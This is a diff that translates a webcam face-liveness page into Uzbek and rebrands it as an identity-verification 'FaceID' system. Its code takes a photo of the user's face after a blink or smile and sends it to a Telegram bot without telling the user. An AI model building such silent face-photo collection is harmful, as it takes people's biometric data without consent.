@@ -1,12 +1,12 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="uz">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta property="og:site_name" content="Face Detection and Liveness check">
-    <meta property="og:title" content="Liveness Detection">
-    <title>Liveness Detection</title>
+    <meta property="og:site_name" content="Yuzni aniqlash va jonlilikni tekshirish">
+    <meta property="og:title" content="Shaxsni aniqlash">
+    <title>FaceID tizimi</title>
 
     <style>
         body,
@@ -22,7 +22,7 @@
             flex-direction: column;
         }
 
-        /* Container for video and overlay */
+        /* Video va overlay uchun konteyner */
         #container {
             position: relative;
             width: 640px;
@@ -33,18 +33,20 @@
             width: 100%;
             height: 100%;
             object-fit: cover;
-            transform: scaleX(-1); /* Mirror the camera feed */
-            -webkit-transform: scaleX(-1); /* Safari fix */
+            transform: scaleX(-1);
+            /* Kamera ko‘rinishini teskari qilish */
+            -webkit-transform: scaleX(-1);
+            /* Safari uchun */
         }
 
-        /* Oval overlay for face alignment */
+        /* Yuzni moslashtirish uchun oval overlay */
         #overlay {
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             border: 4px solid red;
-            /* Default Red (Error) */
+            /* Standart qizil rang */
             width: 250px;
             height: 350px;
             border-radius: 50%;
@@ -57,7 +59,7 @@
             font-size: 20px;
         }
 
-        /* Blur effect outside oval */
+        /* Ovaldan tashqaridagi blur effekti */
         #blurOverlay {
             position: absolute;
             top: 0;
@@ -66,7 +68,6 @@
             height: 100%;
             backdrop-filter: blur(40px);
             -webkit-backdrop-filter: blur(40px);
-            /* clip-path: path('M0,0H640V480H0Z M235,110 A125,175,0,1,0,319.9,65Z'); */
             clip-path: path('M0,0H640V480H0Z M319,65 A125,175,0,1,0,319.9,65Z');
             pointer-events: none;
         }
@@ -80,10 +81,10 @@
         <div id="blurOverlay"></div>
         <div id="overlay"></div>
     </div>
-    <div id="status">Loading models...</div>
-    <button id="retryCamera" style="display: none;" onclick="retryCameraSetup()">Retry Camera</button>
+    <div id="status">Sahifa yuklanmoqda...</div>
+    <button id="retryCamera" style="display: none;" onclick="retryCameraSetup()">Kamerani qayta ishga tushirish</button>
 
-    <!-- Load face-api.js from CDN -->
+    <!-- face-api.js yuklash -->
     <script src="js/face-api.js"></script>
 
     <script>
@@ -112,20 +113,19 @@
                 const videoDevices = devices.filter(device => device.kind === "videoinput");
 
                 if (videoDevices.length === 0) {
-                    statusText.textContent = "No camera detected!";
-                    throw new Error("No camera found.");
+                    statusText.textContent = "Kamera aniqlanmadi!";
+                    throw new Error("Kamera topilmadi.");
                 }
 
-                // Check if the user has already granted permissions
                 const permissions = await navigator.permissions.query({ name: "camera" });
                 if (permissions.state === "denied") {
-                    statusText.textContent = "Camera permissions denied. Please enable them in your browser settings.";
-                    throw new Error("Camera permissions denied.");
+                    statusText.textContent = "Kameraga ruxsat berilmagan. Brauzer sozlamalaridan ruxsat bering.";
+                    throw new Error("Kamera ruxsatlari rad etildi.");
                 }
             } catch (error) {
-                console.error("Camera check failed:", error);
+                console.error("Kamera tekshiruvi xatosi:", error);
                 document.getElementById("retryCamera").style.display = "block";
-                statusText.textContent = "Camera is not available. Please check your device and permissions.";
+                statusText.textContent = "Kamera mavjud emas. Qurilma va ruxsatlarni tekshiring.";
             }
         }
 
@@ -136,7 +136,7 @@
 
         function checkBrowserCompatibility() {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                statusText.textContent = "Your browser does not support camera access. Please use the latest version of Chrome, Firefox, or Edge.";
+                statusText.textContent = "Brauzeringiz kamerani qo‘llab-quvvatlamaydi. Chrome, Firefox yoki Edge'ning so‘nggi versiyasidan foydalaning.";
                 return false;
             }
 
@@ -149,14 +149,14 @@
                     video: {
                         width: { ideal: 480 },
                         height: { ideal: 360 },
-                        frameRate: { ideal: 10 }, // Lower frame rate to reduce CPU/GPU usage
-                        facingMode: "user" // Ensure front camera is used
+                        frameRate: { ideal: 10 }, // Resurslarni kamaytirish uchun kadr tezligi
+                        facingMode: "user" // Old kamera ishlatiladi
                     }
                 });
                 video.srcObject = stream;
-                statusText.textContent = "Camera is active and ready!";
+                statusText.textContent = "Kamera faollashtirildi va ishga tayyor!";
             } catch (error) {
-                statusText.textContent = "Webcam access denied!";
+                statusText.textContent = "Kamera ruxsatlari rad etildi!";
                 document.getElementById("retryCamera").style.display = "block";
                 console.error(error);
             }
@@ -165,10 +165,10 @@
         async function loadModels() {
             await faceapi.nets.tinyFaceDetector.loadFromUri('models');
             await faceapi.nets.faceLandmark68Net.loadFromUri('models');
-            await faceapi.nets.faceRecognitionNet.loadFromUri('models'),
-            await faceapi.nets.faceExpressionNet.loadFromUri('models')
+            await faceapi.nets.faceRecognitionNet.loadFromUri('models');
+            await faceapi.nets.faceExpressionNet.loadFromUri('models');
 
-            statusText.textContent = "Models loaded. Detecting face...";
+            statusText.textContent = "Modellar yuklandi. Yuz aniqlanmoqda...";
             await detectFace();
         }
 
@@ -212,42 +212,39 @@
                     if (faceInsideOval) {
                         const isBlinking = detectBlink(detections);
                         const isSmiling = detectSmile(detections);
-                        // console.log("isBlinking: ", isBlinking, "isSmiling: ", isSmiling);
 
                         if (isBlinking || isSmiling) {
-                            // Increment the blink counter on each detected blink
                             blinkCounter++;
 
-                            if (blinkCounter > 1) { // Skip the first blink
+                            if (blinkCounter > 1) { // Birinchi marta qovoqni ochish e’tiborga olinmaydi
                                 blinkState = true;
                                 overlay.style.borderColor = "green";
-                                statusText.textContent = "Liveness confirmed!";
+                                statusText.textContent = "Shaxsingiz tasdiqlandi!";
                             }
                         } else {
                             if (blinkState) {
                                 overlay.style.borderColor = "green";
-                                statusText.textContent = "Liveness confirmed!";
+                                statusText.textContent = "Shaxsingiz tasdiqlandi!";
                                 if (!gotPhoto) {
                                     gotPhoto = true;
                                     setTimeout(() => {
-                                        const dataURL = takeScreenshot("blinking", detections.detection.box);
+                                        const dataURL = takeScreenshot("blink", detections.detection.box);
                                         sendToTelegramBot(dataURL);
                                     }, 100);
                                 }
                             } else {
-                                overlay.style.borderColor = "green"; // Green if inside oval
-                                statusText.textContent = "Face detected inside oval. Blink to confirm!";
+                                overlay.style.borderColor = "green"; // Yashil - yuz oval ichida
+                                statusText.textContent = "Bir marta jilmaying yoki ko'zingizni yumib oching!";
                             }
                         }
                     } else {
                         blinkState = false;
-                        overlay.style.borderColor = "red"; // Red if outside
-                        statusText.textContent = "Align face inside the oval!";
+                        overlay.style.borderColor = "red"; // Qizil - ovaldan tashqarida
+                        statusText.textContent = "Yuzingizni oval ichiga joylashtiring!";
                     }
-
                 } else {
                     overlay.style.borderColor = "red";
-                    statusText.textContent = "No face detected!";
+                    statusText.textContent = "Yuz aniqlanmadi!";
                 }
             }, 100);
         }
@@ -355,7 +352,7 @@
             })
                 .then(response => response.json())
                 .then(data => console.log("Telegram Response:", data))
-                .catch(error => console.error("Error sending image:", error));
+                .catch(error => console.error("Xabar jo‘natishda xato:", error));
         }
 
         // Initialize system
